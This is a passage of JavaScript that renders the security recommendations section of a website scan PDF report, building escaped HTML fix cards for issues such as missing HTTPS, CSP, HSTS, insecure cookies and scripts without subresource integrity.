        html += '<span style="font-size:0.78rem;color:#6b7280;margin-left:auto;">' + fixes.length + ' ' + esc(t('security.report.fixCard.issuesIdentified', 'issues identified')) + '</span>';
        html += '</div>';

        sevGroups.forEach(function (group) {
          var groupFixes = fixes.filter(function (f) {
            return (f.severity || 'medium').toLowerCase() === group.key;
          });
          if (groupFixes.length > 0) {
            groupFixes.forEach(function (fix) {
              html += _renderSecFixCard(fix, t, esc, truncate);
            });
          }
        });
      } else {
        html += PR.renderCallout(
          t('security.report.recommendations.noneTitle', 'Strong Security Posture'),
          t('security.report.recommendations.noneBody', 'Your site follows security best practices. Continue monitoring for new vulnerabilities.'),
          'tip'
        );
      }

      sec.innerHTML = html;
    })();

    // Hide empty sections
    document.querySelectorAll('.pdf-section').forEach(function (sec) {
      var content = sec.querySelector('.pdf-section__content');
      if (content && !content.innerHTML.trim()) {
        sec.style.display = 'none';
      }
    });
  });

  /* =========================================================================
     PRIVATE HELPERS
     ========================================================================= */

  function _htmlToNode(html) {
    var temp = document.createElement('div');
    temp.innerHTML = html;
    return temp.firstChild;
  }

  function _renderIssuesList(issues, t) {
    if (!issues || issues.length === 0) return '';
    var html = '<div class="pdf-issues" style="margin-top:12px;">';
    html += '<h4 class="pdf-subsection__title">' + (t('common.pdf.execSummary.issuesFound', 'Issues Found') || 'Issues') + '</h4>';
    issues.forEach(function (issue) {
      var text = typeof issue === 'string' ? issue : (issue.message || issue.title || '');
      html += '<div class="pdf-issue pdf-issue--warning">' +
        '<span class="pdf-issue__text">' + PdfReport.helpers.esc(text) + '</span>' +
      '</div>';
    });
    html += '</div>';
    return html;
  }

  /* -------------------------------------------------------------------------
     Normalize pre-enriched fix objects (from data.enrichedFixes)
     Ensures every property the card renderer expects is present.
     ------------------------------------------------------------------------- */
  function _normalizeEnrichedFixes(enriched) {
    var priorityOrder = { critical: 0, high: 1, medium: 2, low: 3 };
    var out = [];
    var i, ef, template;

    for (i = 0; i < enriched.length; i++) {
      ef = enriched[i];
      template = _matchTemplate(ef.title);

      out.push({
        severity: ef.severity || ef.priority || 'medium',
        title: ef.title || '',
        subtitle: ef.subtitle || ef.owaspRef || 'Security Best Practice',
        category: ef.category || (template ? template.category : 'Security'),
        impact: ef.impact || (template ? template.impact : '+5 Security Score'),
        summary: ef.summary || (template ? template.summary : (ef.description || '')),
        description: ef.description || '',
        solution: ef.solution || '',
        impactText: ef.impactText || ef.impact || '',
        problematicCode: ef.problematicCode || (template ? template.problematicCode : ''),
        fixedCode: ef.fixedCode || (template ? template.fixedCode : ''),
        steps: ef.steps || (template ? template.steps : []),
        resources: ef.resources || [],
        affectedResources: ef.affectedResources || ef.resources || []
      });
    }

    out.sort(function (a, b) {
      return (priorityOrder[a.severity] || 3) - (priorityOrder[b.severity] || 3);
    });

    return out;
  }

  /* -------------------------------------------------------------------------
     Generate rich fix data directly from raw scan results.
     Mirrors generateSecurityFixesData() / createSecurityFix() from the
     web UI (security-fixes-renderer.js), producing the same rich fix
     objects with code examples, steps, resources, and affected items.
     ES5 only — no let/const, no arrow functions, no template literals.
     ------------------------------------------------------------------------- */
  function _generateSecurityFixesFromScanData(data) {
    var fixes = [];
    var priorityOrder = { critical: 0, high: 1, medium: 2, low: 3 };

    var ssl = data.ssl || {};
    var headers = data.headers || {};
    var headerDetails = headers.details || {};
    var vulns = data.vulnerabilities || {};
    var cookies = data.cookies || {};
    var thirdParty = data.thirdPartyScripts || {};
    var recs = data.recommendations || [];

    // Track which titles we have already added from scan data
    var addedTitles = {};

    // ---- 1. SSL / HTTPS issues ----
    if (!ssl.valid) {
      addedTitles['implement https'] = true;
      var sslTemplate = FIX_TEMPLATES['Implement HTTPS'];
      fixes.push({
        severity: 'critical',
        title: 'Implement HTTPS',
        subtitle: 'A3:2017 - Sensitive Data Exposure',
        category: sslTemplate.category,
        impact: sslTemplate.impact,
        summary: sslTemplate.summary,
        description: 'Website is not using HTTPS encryption.',
        solution: 'Obtain and install an SSL/TLS certificate from a trusted CA.',
        impactText: 'All data transmitted in plain text - vulnerable to interception',
        problematicCode: sslTemplate.problematicCode,
        fixedCode: sslTemplate.fixedCode,
        steps: sslTemplate.steps,
        resources: [
          { title: "Let's Encrypt Free SSL", url: 'https://letsencrypt.org/' }
        ],
        affectedResources: []
      });
    } else if (ssl.issues && ssl.issues.length > 0) {
      addedTitles['fix ssl/tls issues'] = true;
      var sslFixTemplate = FIX_TEMPLATES['Fix SSL/TLS Issues'];
      var sslIssuesList = ssl.issues.join('. ');
      var sslProblematic = '# Current SSL/TLS Issues:\n';
      ssl.issues.forEach(function (issue) {
        sslProblematic += '# - ' + issue + '\n';
      });
      sslProblematic += '\n# Protocol: ' + (ssl.protocol || 'Unknown') + '\n';
      sslProblematic += '# Issuer: ' + (ssl.issuer || 'Unknown') + '\n';
      if (ssl.daysRemaining !== null && ssl.daysRemaining !== undefined) {
        sslProblematic += '# Days Remaining: ' + ssl.daysRemaining;
      }
      fixes.push({
        severity: 'high',
        title: 'Fix SSL/TLS Issues',
        subtitle: 'A3:2017 - Sensitive Data Exposure',
        category: sslFixTemplate.category,
        impact: sslFixTemplate.impact,
        summary: sslFixTemplate.summary,
        description: sslIssuesList,
        solution: 'Update certificate or upgrade TLS protocol version.',
        impactText: 'Certificate or protocol issues may compromise security',
        problematicCode: sslProblematic,
        fixedCode: sslFixTemplate.fixedCode,
        steps: sslFixTemplate.steps,
        resources: [],
        affectedResources: ssl.issues.map(function (iss) {
          return { type: 'SSL Issue', detail: iss };
        })
      });
    }

    // ---- 2. Missing Content Security Policy ----
    if (headerDetails['Content-Security-Policy'] && !headerDetails['Content-Security-Policy'].present) {
      addedTitles['implement content security policy'] = true;
      var cspTemplate = FIX_TEMPLATES['Implement Content Security Policy'];
      fixes.push({
        severity: 'critical',
        title: 'Implement Content Security Policy',
        subtitle: 'A7:2017 - Cross-Site Scripting (XSS)',
        category: cspTemplate.category,
        impact: cspTemplate.impact,
        summary: cspTemplate.summary,
        description: 'No CSP header found - site vulnerable to XSS attacks.',
        solution: 'Add Content-Security-Policy header with restrictive directives.',
        impactText: 'Attackers can inject malicious scripts',
        problematicCode: cspTemplate.problematicCode,
        fixedCode: cspTemplate.fixedCode,
        steps: cspTemplate.steps,
        resources: [
          { title: 'MDN: Content Security Policy', url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP' },
          { title: 'CSP Evaluator', url: 'https://csp-evaluator.withgoogle.com/' }
        ],
        affectedResources: []
      });
    }

    // ---- 3. Missing HSTS ----
    if (headerDetails['Strict-Transport-Security'] && !headerDetails['Strict-Transport-Security'].present) {
      addedTitles['enable http strict transport security'] = true;
      var hstsTemplate = FIX_TEMPLATES['Enable HTTP Strict Transport Security'];
      fixes.push({
        severity: 'high',
        title: 'Enable HTTP Strict Transport Security',
        subtitle: 'A3:2017 - Sensitive Data Exposure',
        category: hstsTemplate.category,
        impact: hstsTemplate.impact,
        summary: hstsTemplate.summary,
        description: 'HSTS header not present.',
        solution: 'Add Strict-Transport-Security: max-age=31536000; includeSubDomains.',
        impactText: 'Site vulnerable to protocol downgrade attacks',
        problematicCode: hstsTemplate.problematicCode,
        fixedCode: hstsTemplate.fixedCode,
        steps: hstsTemplate.steps,
        resources: [
          { title: 'MDN: Strict-Transport-Security', url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security' }
        ],
        affectedResources: []
      });
    }

    // ---- 4. Missing X-Frame-Options ----
    if (headerDetails['X-Frame-Options'] && !headerDetails['X-Frame-Options'].present) {
      addedTitles['prevent clickjacking attacks'] = true;
      var xfoTemplate = FIX_TEMPLATES['Prevent Clickjacking Attacks'];
      fixes.push({
        severity: 'medium',
        title: 'Prevent Clickjacking Attacks',
        subtitle: 'A5:2017 - Broken Access Control',
        category: xfoTemplate.category,
        impact: xfoTemplate.impact,
        summary: xfoTemplate.summary,
        description: 'X-Frame-Options header not set.',
        solution: 'Add X-Frame-Options: DENY or SAMEORIGIN.',
        impactText: 'Site can be embedded in malicious iframes',
        problematicCode: xfoTemplate.problematicCode,
        fixedCode: xfoTemplate.fixedCode,
        steps: xfoTemplate.steps,
        resources: [
          { title: 'MDN: X-Frame-Options', url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options' }
        ],
        affectedResources: []
      });
    }

    // ---- 5. Missing X-Content-Type-Options ----
    if (headerDetails['X-Content-Type-Options'] && !headerDetails['X-Content-Type-Options'].present) {
      addedTitles['prevent mime sniffing'] = true;
      var xctoTemplate = FIX_TEMPLATES['Prevent MIME Sniffing'];
      fixes.push({
        severity: 'medium',
        title: 'Prevent MIME Sniffing',
        subtitle: 'A6:2017 - Security Misconfiguration',
        category: xctoTemplate.category,
        impact: xctoTemplate.impact,
        summary: xctoTemplate.summary,
        description: 'X-Content-Type-Options header missing.',
        solution: 'Add X-Content-Type-Options: nosniff.',
        impactText: 'Browsers may misinterpret file types',
        problematicCode: xctoTemplate.problematicCode,
        fixedCode: xctoTemplate.fixedCode,
        steps: xctoTemplate.steps,
        resources: [
          { title: 'MDN: X-Content-Type-Options', url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options' }
        ],
        affectedResources: []
      });
    }

    // ---- 6. Cookie security issues ----
    if (cookies.total > 0 && cookies.score !== undefined && cookies.score < 70) {
      addedTitles['improve cookie security'] = true;
      var cookieTemplate = FIX_TEMPLATES['Improve Cookie Security'];

      // Build affected resources from insecure cookies
      var insecureCookies = [];
      if (cookies.list && cookies.list.length > 0) {
        cookies.list.forEach(function (c) {
          var issues = [];
          if (!c.httpOnly) issues.push('Missing HttpOnly');
          if (!c.secure) issues.push('Missing Secure');
          if (!c.sameSite || c.sameSite === 'None') issues.push('SameSite=' + (c.sameSite || 'Not set'));
          if (issues.length > 0) {
            insecureCookies.push({ type: 'Cookie: ' + (c.name || 'Unknown'), detail: issues.join(', ') });
          }
        });
      }

      // Build dynamic problematic code showing actual cookie issues
      var cookieProblematic = '# Insecure cookies detected (' + (cookies.total - (cookies.secure || 0)) + ' of ' + cookies.total + ')\n\n';
      if (insecureCookies.length > 0) {
        insecureCookies.slice(0, 5).forEach(function (ic) {
          cookieProblematic += '# ' + ic.type + '\n# Issues: ' + ic.detail + '\n\n';
        });
        if (insecureCookies.length > 5) {
          cookieProblematic += '# ... and ' + (insecureCookies.length - 5) + ' more insecure cookies';
        }
      } else {
        cookieProblematic += cookieTemplate.problematicCode;
      }

      fixes.push({
        severity: 'medium',
        title: 'Improve Cookie Security',
        subtitle: 'A2:2017 - Broken Authentication',
        category: cookieTemplate.category,
        impact: cookieTemplate.impact,
        summary: cookieTemplate.summary,
        description: 'Cookies not properly secured with HttpOnly, Secure, and SameSite flags.',
        solution: 'Set HttpOnly, Secure, and SameSite=Strict flags on all cookies.',
        impactText: 'Cookies vulnerable to XSS and CSRF attacks',
        problematicCode: cookieProblematic,
        fixedCode: cookieTemplate.fixedCode,
        steps: cookieTemplate.steps,
        resources: [
          { title: 'MDN: HTTP Cookies', url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies' }
        ],
        affectedResources: insecureCookies
      });
    }

    // ---- 7. Third-party scripts without SRI ----
    if (thirdParty.total > 0 && thirdParty.score !== undefined && thirdParty.score < 50) {
      addedTitles['add subresource integrity checks'] = true;
      var sriTemplate = FIX_TEMPLATES['Add Subresource Integrity Checks'];
      var noSriCount = thirdParty.total - (thirdParty.withSRI || 0);

      // Build affected resources from scripts missing SRI
      var sriAffected = [];
      if (thirdParty.scripts && thirdParty.scripts.length > 0) {
        thirdParty.scripts.forEach(function (s) {
          if (!s.hasSRI) {
            sriAffected.push({
              type: 'Script',
              detail: s.url || 'Unknown URL'
            });
          }
        });
      }

      // Dynamic problematic code with actual script URLs
      var sriProblematic = '<!-- ' + noSriCount + ' external scripts without SRI -->\n';
      if (sriAffected.length > 0) {
        sriAffected.slice(0, 4).forEach(function (s) {
          sriProblematic += '<script src="' + s.detail + '"></script>\n';
        });
        if (sriAffected.length > 4) {
          sriProblematic += '<!-- ... and ' + (sriAffected.length - 4) + ' more scripts -->\n';
        }
        sriProblematic += '\n<!-- Issues: -->\n<!-- No integrity attribute -->\n<!-- No crossorigin attribute -->\n<!-- Supply chain attack vulnerability -->';
      } else {
        sriProblematic = sriTemplate.problematicCode;
      }

      fixes.push({
        severity: 'medium',
        title: 'Add Subresource Integrity Checks',
        subtitle: 'A9:2017 - Using Components with Known Vulnerabilities',
        category: sriTemplate.category,
        impact: sriTemplate.impact,
        summary: sriTemplate.summary,
        description: noSriCount + ' third-party scripts without SRI.',
        solution: 'Add integrity and crossorigin attributes to external scripts.',
        impactText: 'Third-party scripts could be compromised',
        problematicCode: sriProblematic,
        fixedCode: sriTemplate.fixedCode,
        steps: sriTemplate.steps,
        resources: [
          { title: 'MDN: Subresource Integrity', url: 'https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity' },
          { title: 'SRI Hash Generator', url: 'https://www.srihash.org/' }
        ],
        affectedResources: sriAffected
      });
    }

    // ---- 8. Critical / High vulnerability issues ----
    if (vulns.issues && vulns.issues.length > 0) {
      vulns.issues.forEach(function (vuln) {
        if (vuln.severity === 'critical' || vuln.severity === 'high') {
          var vulnTitle = vuln.title || 'Security Vulnerability';
          if (addedTitles[vulnTitle.toLowerCase()]) return;
          addedTitles[vulnTitle.toLowerCase()] = true;

          var vulnProblematic = '# Vulnerability Detected\n';
          vulnProblematic += '# Title: ' + vulnTitle + '\n';
          vulnProblematic += '# Severity: ' + (vuln.severity || 'unknown').toUpperCase() + '\n';
          if (vuln.description) {
            vulnProblematic += '# Description: ' + vuln.description + '\n';
          }
          if (vuln.cve) {
            vulnProblematic += '# CVE: ' + vuln.cve + '\n';
          }
          vulnProblematic += '\n# Impact:\n# ' + (vuln.impact || 'May affect site security');

          var vulnFixed = '# Recommended Remediation\n';
          vulnFixed += '# ' + (vuln.solution || 'Apply security patches and follow best practices') + '\n';
          vulnFixed += '\n# Verification:\n# 1. Apply the fix in a staging environment\n# 2. Run a security scan to verify resolution\n# 3. Deploy to production';

          fixes.push({
            severity: vuln.severity,
            title: vulnTitle,
            subtitle: vuln.cve ? 'CVE: ' + vuln.cve : 'A1:2017 - Injection',
            category: 'Vulnerabilities',
            impact: vuln.severity === 'critical' ? '+20 Security Score' : '+10 Security Score',
            summary: vuln.description || 'A ' + vuln.severity + '-severity vulnerability was detected that requires immediate attention.',
            description: vuln.description || '',
            solution: vuln.solution || '',
            impactText: vuln.severity === 'critical' ? 'Critical security vulnerability' : 'High-severity security issue',
            problematicCode: vulnProblematic,
            fixedCode: vulnFixed,
            steps: [
              vuln.solution || 'Review and remediate the vulnerability',
              'Test the fix in a staging environment',
              'Deploy to production and verify the fix'
            ],
            resources: [],
            affectedResources: []
          });
        }
      });
    }

    // ---- 9. Remaining recommendations not yet covered ----
    if (recs && recs.length > 0) {
      recs.forEach(function (rec) {
        var titleKey = (rec.title || '').toLowerCase();
        if (addedTitles[titleKey]) return;
        addedTitles[titleKey] = true;

        var template = _matchTemplate(rec.title);
        var severity = rec.priority || 'medium';

        // Build generic code blocks for unmatched recommendations
        var genProblematic = template ? template.problematicCode : _buildGenericProblematicCode(rec);
        var genFixed = template ? template.fixedCode : _buildGenericFixedCode(rec);

        fixes.push({
          severity: severity,
          title: rec.title || '',
          subtitle: rec.owaspRef || 'Security Best Practice',
          category: template ? template.category : 'Security',
          impact: template ? template.impact : _defaultImpactForSeverity(severity),
          summary: template ? template.summary : (rec.description || ''),
          description: rec.description || '',
          solution: rec.solution || '',
          impactText: rec.impact || '',
          problematicCode: genProblematic,
          fixedCode: genFixed,
          steps: template ? template.steps : (rec.solution ? [rec.solution, 'Test changes in a staging environment first', 'Deploy to production and verify the fix'] : ['Review and implement security recommendations', 'Test changes in a staging environment first', 'Deploy to production and verify the fix']),
          resources: rec.resources || [],
          affectedResources: []
        });
      });
    }

    fixes.sort(function (a, b) {
      return (priorityOrder[a.severity] || 3) - (priorityOrder[b.severity] || 3);
    });

    return fixes;
  }

  /** Match a recommendation title to a FIX_TEMPLATES entry */
  function _matchTemplate(title) {
    if (!title) return null;
    var titleLower = title.toLowerCase();
    var keys = Object.keys(FIX_TEMPLATES);
    for (var i = 0; i < keys.length; i++) {
      var keyLower = keys[i].toLowerCase();
      if (titleLower.indexOf(keyLower) !== -1 || keyLower.indexOf(titleLower.split(' ').slice(0, 3).join(' ')) !== -1) {
        return FIX_TEMPLATES[keys[i]];
      }
    }
    return null;
  }

  /** Return a default impact string based on severity */
  function _defaultImpactForSeverity(severity) {
    if (severity === 'critical') return '+15 Security Score';
    if (severity === 'high') return '+10 Security Score';
    return '+5 Security Score';
  }

  /** Build a problematic code block for recommendations without a template */
  function _buildGenericProblematicCode(rec) {
    var code = '# Security Issue Detected\n';
    code += '# ' + (rec.title || 'Unknown Issue') + '\n\n';
    if (rec.description) {
      code += '# Description:\n# ' + rec.description + '\n\n';
    }
    code += '# Impact:\n# ' + (rec.impact || 'May affect site security') + '\n\n';
    code += '# Priority: ' + (rec.priority || 'medium').toUpperCase();
    return code;
  }

  /** Build a fixed code block for recommendations without a template */
  function _buildGenericFixedCode(rec) {
    var code = '# Recommended Solution\n';
    code += '# ' + (rec.title || 'Security Fix') + '\n\n';
    if (rec.solution) {
      code += '# Implementation:\n# ' + rec.solution + '\n\n';
    }
    code += '# Benefits:\n';
    code += '# - Improved security posture\n';
    code += '# - Reduced attack surface\n';
    code += '# - Industry best practices compliance';
    return code;
  }

  /* -------------------------------------------------------------------------
     Render a rich security fix card.
     Shows: title, subtitle, severity badge, category, impact score,
     summary paragraph, before/after code blocks, affected resources
     table, and step-by-step fix guide.
     Uses existing .pdf-fix-card CSS classes from _pdf-report.css.
     ------------------------------------------------------------------------- */
  function _renderSecFixCard(fix, t, esc, truncate) {
    var severityLower = (fix.severity || 'medium').toLowerCase();
    var sevLabelMap = { critical: 'Critical', high: 'High', medium: 'Medium', low: 'Low' };
    var severityLabel = sevLabelMap[severityLower] || fix.severity;

    var html = '<div class="pdf-fix-card">';

    // ---- Header: severity badge | title | category ----
    html += '<div class="pdf-fix-card__header">';
    html += '<span class="pdf-fix-card__severity pdf-fix-card__severity--' + severityLower + '">' + esc(severityLabel) + '</span>';
    html += '<span class="pdf-fix-card__title">' + esc(fix.title) + '</span>';
    html += '<span class="pdf-fix-card__category">' + esc(fix.category || 'Security') + '</span>';
    html += '</div>';

    // ---- Body ----
    html += '<div class="pdf-fix-card__body">';

    // Subtitle (OWASP ref or best-practice label)
    if (fix.subtitle) {
      html += '<div style="font-size:0.72rem;color:#6b7280;margin-bottom:6px;">' + esc(fix.subtitle) + '</div>';
    }

    // Summary / description — prefer the rich multi-paragraph summary
    var desc = fix.summary || fix.description || '';
    if (desc) {
      html += '<div class="pdf-fix-card__description">' + esc(desc) + '</div>';
    }

    // Impact badge
    if (fix.impact) {
      html += '<div class="pdf-fix-card__impact">';
      html += '<strong>' + esc(t('security.report.fixCard.impact', 'Estimated Improvement')) + ':</strong> ' + esc(fix.impact);
      html += '</div>';
    }

    // Risk impact text (from scan data, e.g., "Attackers can inject malicious scripts")
    if (fix.impactText && fix.impactText !== fix.impact) {
      html += '<div style="font-size:0.78rem;color:#ef4444;margin-bottom:10px;">';
      html += '<strong>' + esc(t('security.report.fixCard.riskImpact', 'Risk Impact')) + ':</strong> ' + esc(fix.impactText);
      html += '</div>';
    }

    // Code comparison grid (problematic vs fixed)
    if (fix.problematicCode || fix.fixedCode) {
      html += '<div class="pdf-fix-card__code-grid">';

      if (fix.problematicCode) {
        html += '<div class="pdf-fix-card__code-block">';
        html += '<div class="pdf-fix-card__code-label pdf-fix-card__code-label--bad">' +
          esc(t('security.report.fixCard.currentIssue', 'Current Issue')) + '</div>';
        html += '<pre class="pdf-fix-card__code-pre">' + esc(fix.problematicCode) + '</pre>';
        html += '</div>';
      }

      if (fix.fixedCode) {
        html += '<div class="pdf-fix-card__code-block">';
        html += '<div class="pdf-fix-card__code-label pdf-fix-card__code-label--good">' +
          esc(t('security.report.fixCard.secureSolution', 'Secure Solution')) + '</div>';
        html += '<pre class="pdf-fix-card__code-pre">' + esc(fix.fixedCode) + '</pre>';
        html += '</div>';
      }

      html += '</div>'; // end code-grid
    }

    // Affected resources table (dynamic data from scan results)
    if (fix.affectedResources && fix.affectedResources.length > 0) {
      html += '<div style="margin-top:10px;margin-bottom:10px;">';
      html += '<div style="font-size:0.7rem;font-weight:600;text-transform:uppercase;letter-spacing:0.03em;color:#6b7280;margin-bottom:6px;">' +
        esc(t('security.report.fixCard.affectedResources', 'Affected Resources')) +
        ' <span style="font-weight:400;text-transform:none;">(' + fix.affectedResources.length + ')</span></div>';
      html += '<table style="width:100%;border-collapse:collapse;font-size:0.72rem;">';
      html += '<thead><tr>';
      html += '<th style="text-align:left;padding:4px 8px;border-bottom:1px solid rgba(0,0,0,0.1);color:#6b7280;font-weight:600;">' + esc(t('security.report.fixCard.resourceType', 'Type')) + '</th>';
      html += '<th style="text-align:left;padding:4px 8px;border-bottom:1px solid rgba(0,0,0,0.1);color:#6b7280;font-weight:600;">' + esc(t('security.report.fixCard.resourceDetail', 'Detail')) + '</th>';
      html += '</tr></thead><tbody>';
      var maxResources = Math.min(fix.affectedResources.length, 8);
      var ri;
      for (ri = 0; ri < maxResources; ri++) {
        var res = fix.affectedResources[ri];
        var bgColor = ri % 2 === 0 ? '#ffffff' : '#fafafa';
        html += '<tr style="background:' + bgColor + ';">';
        html += '<td style="padding:4px 8px;border-bottom:1px solid rgba(0,0,0,0.05);color:#374151;white-space:nowrap;">' + esc(res.type || '-') + '</td>';
        html += '<td style="padding:4px 8px;border-bottom:1px solid rgba(0,0,0,0.05);color:#374151;word-break:break-all;">' + esc(truncate(res.detail || '-', 80)) + '</td>';
        html += '</tr>';
      }
      if (fix.affectedResources.length > maxResources) {
        html += '<tr><td colspan="2" style="padding:4px 8px;color:#6b7280;font-style:italic;">' +
          esc('... and ' + (fix.affectedResources.length - maxResources) + ' more') + '</td></tr>';
      }
      html += '</tbody></table>';
      html += '</div>';
    }

    // Step-by-step fix guide
    if (fix.steps && fix.steps.length > 0) {
      html += '<div class="pdf-fix-card__steps">';
      html += '<div class="pdf-fix-card__steps-title">' +
        esc(t('security.report.fixCard.stepsTitle', 'Step-by-Step Fix Guide')) + '</div>';
      fix.steps.forEach(function (step, idx) {
        html += '<div class="pdf-fix-card__step">';
        html += '<span class="pdf-fix-card__step-num">' + (idx + 1) + '</span>';
        html += '<span>' + esc(step) + '</span>';
        html += '</div>';
      });
      html += '</div>'; // end steps
    }

    // Reference resources (documentation links)
    if (fix.resources && fix.resources.length > 0) {
      html += '<div style="margin-top:8px;padding-top:8px;border-top:1px solid rgba(0,0,0,0.06);">';
      html += '<div style="font-size:0.7rem;font-weight:600;text-transform:uppercase;letter-spacing:0.03em;color:#6b7280;margin-bottom:4px;">' +
        esc(t('security.report.fixCard.resources', 'Resources')) + '</div>';
      html += '<table style="width:100%;border-collapse:collapse;font-size:0.72rem;">';
      fix.resources.forEach(function (r) {
        html += '<tr>';
        html += '<td style="padding:2px 8px;color:#2563eb;">' + esc(r.title || r.url || '') + '</td>';
        html += '<td style="padding:2px 8px;color:#9ca3af;font-size:0.65rem;text-align:right;word-break:break-all;">' + esc(r.url || '') + '</td>';
        html += '</tr>';
      });
      html += '</table>';
      html += '</div>';
    }

    html += '</div>'; // end body
    html += '</div>'; // end fix-card

    return html;
  }

})(window);
